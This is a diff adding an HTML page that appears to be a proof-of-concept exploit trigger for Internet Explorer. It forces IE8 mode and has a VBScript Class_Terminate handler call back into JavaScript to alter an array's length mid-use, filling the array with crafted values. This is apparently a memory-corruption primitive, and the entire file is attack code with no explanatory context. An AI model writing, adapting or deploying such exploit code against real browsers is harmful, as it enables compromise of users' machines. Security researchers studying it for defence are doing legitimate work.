@@ -1,0 +1,63 @@
+<meta http-equiv="x-ua-compatible" content="IE=8">
+
+<script language='javascript'>
+var arr = new Array();
+var arr_arr = new Array();
+var stop = false;
+function ff()
+{
+
+	var old_length = arr_arr.length;
+
+	arr_arr.length = 1;	
+	arr_arr[0] = {};
+	arr_arr.length = old_length;
+
+	stop = true;
+}
+
+
+
+</script>
+
+<script type="text/vbscript">
+
+Dim o
+Class cla0
+ Private Sub Class_Terminate
+  	Call ff
+  End Sub
+End Class
+
+function f1
+	Set o = Nothing
+end function
+
+Set o = new cla0
+
+</script>
+<script language='javascript'>
+//alert(1);
+arr.push(o);
+o = null;
+arr[0] = null;
+
+try {
+for (var i = 0; i < 0x10000000 && !stop; ++ i){
+	arr_arr.push(-(0x100000000 - 0x88888888));
+}
+} catch (e){
+	alert(e);
+}
+//alert(arr_arr.length.toString(16));
+
+	alert(arr_arr.pop());
+
+
+
+</script>
+
+
+
+
+
